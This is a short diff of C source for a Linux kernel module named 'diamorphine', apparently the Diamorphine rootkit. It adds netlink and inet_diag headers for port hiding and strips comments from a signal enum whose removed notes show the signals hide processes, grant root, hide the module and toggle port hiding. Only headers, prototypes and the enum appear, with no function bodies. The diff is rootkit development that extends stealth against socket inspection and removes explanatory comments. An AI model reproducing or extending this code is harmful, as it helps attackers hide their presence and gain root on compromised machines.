@@ -12,11 +12,11 @@
 #include <linux/fs.h>
 #include <linux/string.h>
 #include <linux/fdtable.h>
-
-// Port hiding සඳහා අවශ්ය headers
 #include <net/sock.h>
 #include <net/inet_sock.h>
 #include <linux/seq_file.h>
+#include <linux/netlink.h>
+#include <uapi/linux/inet_diag.h>
 
 unsigned long resolve_sym(char *symbol);
 unsigned long *get_syscall_table_bf(void);
@@ -44,10 +44,10 @@ struct linux_dirent {
 #define MODULE_NAME "diamorphine"
 
 enum {
-    SIGINVIS = 31,      // process hide
-    SIGSUPER = 64,      // give root
-    SIGMODINVIS = 63,   // module hide/show
-    SIGPORTHIDE = 30    // port hide toggle – STANDARD SIGNAL (SIGPWR)
+    SIGINVIS = 31,
+    SIGSUPER = 64,
+    SIGMODINVIS = 63,
+    SIGPORTHIDE = 30
 };
 
 #ifndef IS_ENABLED
